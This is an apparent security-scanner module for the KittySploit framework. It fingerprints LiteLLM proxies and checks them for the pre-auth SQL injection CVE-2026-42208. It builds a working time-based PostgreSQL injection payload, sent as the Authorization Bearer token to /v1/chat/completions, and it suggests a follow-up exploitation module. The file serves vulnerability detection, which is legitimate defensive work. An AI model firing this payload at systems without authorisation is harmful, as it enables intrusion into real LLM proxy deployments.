#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""CVE-2026-42208 — BerriAI LiteLLM pre-auth SQLi detection (Authorization Bearer)."""

import json
import re
import time
from typing import Optional, Tuple

from kittysploit import *
from lib.protocols.http.http_client import Http_client

# Affected: >=1.81.16, <1.83.7 (fixed in 1.83.7)
_AFFECTED_MIN = (1, 81, 16)
_FIXED = (1, 83, 7)

_VERSION_RE = re.compile(
    r"(?:litellm[_-]?(?:version|proxy)?|version)[\"'\s:=]+v?(\d+\.\d+\.\d+(?:\.\w+)?)",
    re.I,
)
_PLAIN_VERSION_RE = re.compile(r"\b(1\.\d{1,3}\.\d{1,3}(?:-[a-z0-9.]+)?)\b", re.I)


class Module(Scanner, Http_client):
    __info__ = {
        "name": "LiteLLM CVE-2026-42208 detection",
        "description": (
            "Detects BerriAI LiteLLM proxy and flags CVE-2026-42208: pre-auth SQL "
            "injection in proxy API key verification (Authorization Bearer interpolated "
            "into combined_view lookup). Affected 1.81.16–1.83.6, fixed in 1.83.7. "
            "Fingerprints /health* and /v1/models; optional time-based confirm via "
            "POST /v1/chat/completions with Bearer ' OR (SELECT pg_sleep(N)) IS NULL -- "
            "(PostgreSQL). Does not dump database contents."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-42208",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-42208",
            "https://github.com/BerriAI/litellm/security/advisories/GHSA-r75f-5x8p-qvmc",
            "https://bishopfox.com/blog/cve-2026-42208-pre-authentication-sql-injection-in-litellm-proxy"],
        "modules": [
            "auxiliary/scanner/http/litellm_cve_2026_42208_sqli"],
        "tags": [
            "web",
            "scanner",
            "litellm",
            "llm",
            "sqli",
            "pre-auth",
            "postgresql",
            "cve-2026-42208",
            "kev"],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 6,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "endpoints"],
            "cost": 1.0,
            "noise": 0.35,
            "value": 1.0,
            "requires": {
                "min_endpoints": 0,
                "min_params": 0,
                "tech_hints_any": ["litellm", "openai"],
                "tech_hints_all": [],
                "specializations_any": [],
                "risk_signals_any": [],
                "auth_session": False,
                "capabilities_any": [],
                "capabilities_all": [],
                "confidence_min": {},
                "confidence_min_any": {},
                "endpoint_pattern_any": [
                    "/v1/chat/completions",
                    "/health/readiness",
                    "/health"],
                "param_any": [],
                "api_surface_ready": False,
            },
            "chain": {
                "produces_capabilities": [
],
                "consumes_capabilities": [],
                "option_bindings": {},
                "suggested_followups": [
                    "auxiliary/scanner/http/litellm_cve_2026_42208_sqli"],
            },
        },
    }

    port = OptPort(4000, "LiteLLM proxy HTTP port (default 4000)", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    base_path = OptString("/", "LiteLLM base path prefix", required=False)
    active_probe = OptBool(
        True,
        "Confirm with time-based pg_sleep via Authorization Bearer",
        required=False,
    )
    sleep_seconds = OptInteger(
        5,
        "pg_sleep() seconds for active probe",
        required=False,
        advanced=True,
    )
    probe_path = OptString(
        "/v1/chat/completions",
        "LLM API route used for the Bearer SQLi probe",
        required=False,
        advanced=True,
    )

    def _timeout(self) -> int:
        return max(int(self.timeout or 15), 10)

    def _base(self) -> str:
        val = str(self.base_path or "/").strip() or "/"
        if not val.startswith("/"):
            val = "/" + val
        return val.rstrip("/") or ""

    def _path(self, suffix: str) -> str:
        base = self._base()
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base else suffix

    @staticmethod
    def _version_tuple(value: str) -> Optional[Tuple[int, ...]]:
        if not value:
            return None
        # Strip suffixes like -stable / -nightly
        core = str(value).split("-", 1)[0].strip()
        parts = []
        for part in core.split(".")[:3]:
            digits = "".join(ch for ch in part if ch.isdigit())
            if not digits:
                return None
            parts.append(int(digits))
        return tuple(parts) if parts else None

    def _is_affected(self, version: str) -> Optional[bool]:
        parsed = self._version_tuple(version)
        if not parsed:
            return None
        if parsed < _AFFECTED_MIN:
            return False
        if parsed >= _FIXED:
            return False
        return True

    def _extract_version(self, text: str) -> str:
        text = text or ""
        try:
            data = json.loads(text)
        except Exception:
            data = None
        if isinstance(data, dict):
            for key in (
                "litellm_version",
                "version",
                "LiteLLM_version",
                "litellm",
            ):
                val = data.get(key)
                if isinstance(val, str) and self._version_tuple(val):
                    return val.strip()
                if isinstance(val, dict):
                    nested = val.get("version") or val.get("litellm_version")
                    if isinstance(nested, str) and self._version_tuple(nested):
                        return nested.strip()
        match = _VERSION_RE.search(text)
        if match:
            return match.group(1)
        match = _PLAIN_VERSION_RE.search(text)
        if match and self._version_tuple(match.group(1)):
            return match.group(1)
        return ""

    def _looks_like_litellm(self) -> Tuple[bool, str, list]:
        version = ""
        hits = []
        markers = (
            "litellm",
            "berriai",
            "openai-compatible",
            "virtual key",
            "auth_error",
        )
        for path in (
            "/health/readiness",
            "/health/liveliness",
            "/health",
            "/v1/models",
            "/models",
            "/",
        ):
            response = self.http_request(
                method="GET",
                path=self._path(path),
                headers={"Accept": "application/json"},
                timeout=self._timeout(),
                allow_redirects=True,
            )
            if not response:
                continue
            text = response.text or ""
            lower = text.lower()
            headers = {k.lower(): str(v).lower() for k, v in (response.headers or {}).items()}
            hit = any(m in lower for m in markers) or "litellm" in headers.get(
                "server", ""
            ) or "litellm" in headers.get("x-litellm-version", "")
            if response.status_code in (200, 401, 403) and (
                hit
                or path.startswith("/health")
                and response.status_code == 200
                and ("status" in lower or "healthy" in lower or "db" in lower)
            ):
                hits.append(f"{path} HTTP {response.status_code}")
                if not version:
                    version = self._extract_version(text)
                    hdr_ver = (response.headers or {}).get("x-litellm-version") or (
                        response.headers or {}
                    ).get("X-Litellm-Version")
                    if hdr_ver and self._version_tuple(str(hdr_ver)):
                        version = str(hdr_ver).strip()
            # Strong signal: OpenAI-style model list + litellm marker
            if response.status_code == 200 and (
                '"data"' in lower and '"id"' in lower and ("gpt" in lower or "model" in lower)
            ):
                hits.append(f"{path} model list")
                if "litellm" in lower or hit:
                    return True, version or self._extract_version(text), hits

        if hits and (
            any("health" in h for h in hits)
            or any("model" in h for h in hits)
            or version
        ):
            # Weak fingerprint: health + openai-ish surface is enough to try probe
            return True, version, hits
        return bool(hits), version, hits

    def _chat_probe(self, bearer: str, timeout: int):
        body = json.dumps(
            {
                "model": "x",
                "messages": [{"role": "user", "content": "x"}],
            }
        )
        start = time.perf_counter()
        response = self.http_request(
            method="POST",
            path=self._path(str(self.probe_path or "/v1/chat/completions")),
            headers={
                "Authorization": f"Bearer {bearer}",
                "Content-Type": "application/json",
                "Accept": "application/json",
            },
            data=body,
            timeout=timeout,
            allow_redirects=False,
        )
        elapsed = time.perf_counter() - start
        return response, elapsed

    def _time_based_confirm(self) -> Tuple[Optional[bool], str]:
        sleep_s = max(int(self.sleep_seconds or 5), 2)
        timeout = max(self._timeout(), sleep_s * 3 + 10)

        # Baseline: benign non-sk- bearer (still fails auth quickly when patched)
        base_resp, base_elapsed = self._chat_probe("ks-baseline-not-a-key", timeout)
        if not base_resp and base_elapsed < 1.0:
            return None, "No response from chat/completions (target unreachable?)"

        payload = f"' OR (SELECT pg_sleep({sleep_s})) IS NULL --"
        inj_resp, inj_elapsed = self._chat_probe(payload, timeout)

        threshold = max(sleep_s * 0.8, base_elapsed + sleep_s * 0.7)
        detail = (
            f"baseline={base_elapsed:.2f}s HTTP "
            f"{getattr(base_resp, 'status_code', '?')}, "
            f"sleep={inj_elapsed:.2f}s HTTP {getattr(inj_resp, 'status_code', '?')}"
        )

        # Vulnerable hosts still return 401 auth_error after the sleep
        if inj_elapsed >= threshold:
            return True, f"Time-based SQLi confirmed ({detail})"

        # Hang / timeout after long wait also suggestive
        if inj_resp is None and inj_elapsed >= threshold:
            return True, f"Time-based SQLi likely — hang/timeout ({detail})"

        return False, f"No significant delay ({detail})"

    def run(self):
        print_status("Fingerprinting LiteLLM proxy…")
        found, version, hits = self._looks_like_litellm()
        if not found:
            print_error("LiteLLM not detected")
            return False

        print_success("LiteLLM-like surface detected")
        for hit in hits[:8]:
            print_info(f"  {hit}")

        affected = None
        if version:
            affected = self._is_affected(version)
            print_info(f"Version: {version}")
            if affected is True:
                print_warning(
                    f"Version in affected range (>=1.81.16, <1.83.7) — "
                    "CVE-2026-42208 likely"
                )
            elif affected is False:
                print_success(
                    f"Version outside vulnerable window "
                    f"(fixed >= {_FIXED[0]}.{_FIXED[1]}.{_FIXED[2]})"
                )
            else:
                print_info("Could not map version to vulnerability window")
        else:
            print_info("Version not advertised — rely on active probe")

        confirmed = None
        reason = ""
        if self.active_probe:
            print_status(
                f"Time-based probe (pg_sleep={int(self.sleep_seconds or 5)}s) "
                f"on {self.probe_path}…"
            )
            confirmed, reason = self._time_based_confirm()
            if confirmed is True:
                print_warning(reason)
            elif confirmed is False:
                print_info(reason)
                if affected is True:
                    print_info(
                        "Version affected but no delay — empty LiteLLM_VerificationToken "
                        "table, disable_error_logs=true, or non-Postgres backend?"
                    )
            else:
                print_error(reason)

        if confirmed is True or affected is True:
            print_warning(
                "Follow up: auxiliary/scanner/http/litellm_cve_2026_42208_sqli"
            )
            return True

        if found and confirmed is False and affected is False:
            print_success("Host appears patched / not vulnerable")
            return True

        print_info("LiteLLM found; vulnerability not confirmed")
        return True
